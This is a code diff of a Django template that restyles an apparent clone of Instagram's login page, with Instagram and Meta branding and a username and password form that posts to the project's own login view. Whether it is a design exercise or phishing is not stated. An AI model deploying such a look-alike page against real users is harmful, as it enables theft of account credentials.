@@ -5,85 +5,69 @@
 <html lang="en">
 
 <head>
+
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="viewport"
+          content="width=device-width,
+                   initial-scale=1.0,
+                   maximum-scale=1.0,
+                   user-scalable=no">
 
     <title>Instagram</title>
-<link rel="icon" href="{% static 'img/insta-fav.ico' %}" type="image/x-icon">
-    <script src="https://cdn.tailwindcss.com"></script>
 
     <link rel="stylesheet"
           href="{% static 'css/style.css' %}">
+
 </head>
 
 
 <body>
 
-<div class="min-h-screen bg-white flex flex-col items-center">
+<div class="page">
 
-    <!-- LOGIN BOX -->
+    <div class="login-box">
 
-    <div class="
-        bg-white
-        border
-        border-gray-300
-        w-full
-        max-w-[500px]
-        min-h-screen
-        flex
-        flex-col
-    ">
 
-        <!-- LOGO -->
+        <!-- =====================================
+             LANGUAGE
+        ====================================== -->
 
-        <div class="
-            h-[132px]
-            border-b
-            border-gray-100
-            flex
-            items-center
-            justify-center
-        ">
+        <div class="language">
+            English (UK)
+        </div>
+
+
+        <!-- =====================================
+             LOGO
+        ====================================== -->
+
+        <div class="logo-wrapper">
 
             <img
                 src="{% static 'img/insta_form_logo.png' %}"
-                alt="Instagram"
+                alt="Instagram Logo"
                 class="instagram-logo"
             >
 
         </div>
 
 
-        <!-- LOGIN CONTENT -->
+        <!-- =====================================
+             LOGIN CONTENT
+        ====================================== -->
 
-        <div class="px-7 pt-14">
-
-            <h2 class="
-                text-black
-                mb-6
-                font-semibold
-                text-[16px]
-                leading-[20px]
-            ">
-                Log into Instagram
-            </h2>
+        <div class="login-content">
 
 
-            <!-- ERROR -->
-
-            <div id="loginError" class="login-error">
-                Correct username and password required.
-            </div>
-
-
-            <!-- FORM -->
+            <!-- =====================================
+                 LOGIN FORM
+            ====================================== -->
 
             <form
+                id="loginForm"
                 method="POST"
                 action="{% url 'login' %}"
-                class="w-full"
-                id="loginForm"
             >
 
                 {% csrf_token %}
@@ -93,11 +77,11 @@
 
                 <input
                     type="text"
-                    name="username"
                     id="username"
-                    placeholder="Mobile number, username or email address"
+                    name="username"
+                    class="login-input"
+                    placeholder="Username, email address or mobile number"
                     autocomplete="off"
-                    class="login-input mb-3"
                 >
 
 
@@ -105,20 +89,20 @@
 
                 <input
                     type="password"
-                    name="password"
                     id="password"
+                    name="password"
+                    class="login-input password"
                     placeholder="Password"
                     autocomplete="off"
-                    class="login-input mb-6"
                 >
 
 
                 <!-- LOGIN BUTTON -->
 
                 <button
-                    type="submit"
                     id="loginButton"
                     class="login-button"
+                    type="submit"
                     disabled
                 >
                     Log in
@@ -127,137 +111,55 @@
             </form>
 
 
-            <!-- FORGOT PASSWORD -->
+            <!-- =====================================
+                 FORGOTTEN PASSWORD
+            ====================================== -->
 
-            <a
-                href="#"
-                class="forgot-password"
-            >
+            <a href="#" class="forgot">
                 Forgotten password?
             </a>
 
 
-            <!-- OR -->
+            <!-- =====================================
+                 CREATE ACCOUNT
+            ====================================== -->
 
-            <div class="
-                flex
-                items-center
-                justify-center
-                w-full
-                mt-10
-                mb-5
-            ">
+            <button
+                type="button"
+                class="create-account"
+            >
+                Create new account
+            </button>
 
-                <span class="
-                    bg-gray-300
-                    h-px
-                    flex-grow
-                "></span>
 
-                <span class="
-                    px-4
-                    text-[13px]
-                    text-gray-500
-                    font-normal
-                ">
-                    OR
-                </span>
+            <!-- =====================================
+                 META
+            ====================================== -->
 
-                <span class="
-                    bg-gray-300
-                    h-px
-                    flex-grow
-                "></span>
+            <div class="meta">
+
+                <img
+                    src="{% static 'img/meta.ico.svg' %}"
+                    class="meta-icon"
+                    alt="Meta"
+                >
 
             </div>
 
-
-            <!-- FACEBOOK -->
-
-            <div class="facebook-login">
-
-                <div class="facebook-logo mr-2"></div>
-
-                <span class="facebook-text">
-                    Log in with Facebook
-                </span>
-
-            </div>
-
-
-            <!-- CREATE ACCOUNT -->
-
-            <div class="create-account">
-
-                <span class="create-account-text">
-                    Create new account
-                </span>
-
-            </div>
-
-
-            <!-- META -->
-
-            <div class="meta-text">
-
-                <span class="meta-symbol">
-                    ∞
-                </span>
-
-                Meta
-
-            </div>
 
         </div>
-
-
-        <!-- FOOTER -->
-
-        <footer class="
-            mt-auto
-            border-t
-            border-gray-100
-            pt-4
-            pb-5
-        ">
-
-            <div class="
-                flex
-                flex-wrap
-                justify-center
-                gap-x-4
-                gap-y-1
-                px-3
-            ">
-
-                <a href="#" class="footer-link">Meta</a>
-                <a href="#" class="footer-link">About</a>
-                <a href="#" class="footer-link">Blog</a>
-                <a href="#" class="footer-link">Jobs</a>
-                <a href="#" class="footer-link">Help</a>
-                <a href="#" class="footer-link">API</a>
-                <a href="#" class="footer-link">Privacy</a>
-                <a href="#" class="footer-link">Terms</a>
-                <a href="#" class="footer-link">Locations</a>
-                <a href="#" class="footer-link">Instagram Lite</a>
-                <a href="#" class="footer-link">Threads</a>
-
-            </div>
-
-            <p class="footer-copy">
-                © 2026 Instagram
-            </p>
-
-        </footer>
 
     </div>
 
 </div>
 
 
-{% load static %}
+<!-- =====================================
+     JAVASCRIPT
+====================================== -->
 
-<script src="{% static 'js/button.js' %}" defer></script>
+<script src="{% static 'js/button.js' %}"></script>
+
 </body>
 
 </html>
